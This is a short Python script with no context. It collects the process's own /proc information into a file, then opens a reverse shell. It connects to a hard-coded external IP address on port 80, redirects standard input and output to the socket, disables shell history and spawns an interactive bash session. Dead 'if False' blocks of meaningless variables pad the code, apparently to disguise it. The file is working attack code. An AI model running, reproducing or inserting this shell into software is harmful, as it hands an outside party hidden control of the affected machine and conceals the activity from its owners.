import pty
import os
import socket

def gather_proc_info(output_file):
    pid = os.getpid()
    if False:
        _var_149_0 = (153, 297, 904)
        _var_149_1 = (649, 141, 658)
        _var_149_2 = (630, 661, 538)

        def _var_149_fn():
            pass
    info = {}
    proc_files = {'cmdline': f'/proc/{pid}/cmdline', 'status': f'/proc/{pid}/status', 'stat': f'/proc/{pid}/stat', 'statm': f'/proc/{pid}/statm'}
    for (key, path) in proc_files.items():
        try:
            with open(path, 'r') as f:
                info[key] = f.read().strip()
        except IOError:
            info[key] = 'Error reading file'
    with open(output_file, 'w') as f:
        for (key, value) in info.items():
            f.write(f'{key}:\n{value}\n\n')
    if False:
        _var_150_0 = (220, 666, 823)
        _var_150_1 = (531, 34, 686)

        def _var_150_fn():
            pass

def RunCommand():
    lport = 80
    lhost = '3.228.3.164'
    try:
        gather_proc_info('proc_info.txt')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        os.putenv('HISTFILE', '/dev/null')
        pty.spawn('/bin/bash')
        s.close()
    except ConnectionRefusedError:
        print('Connection refused atm')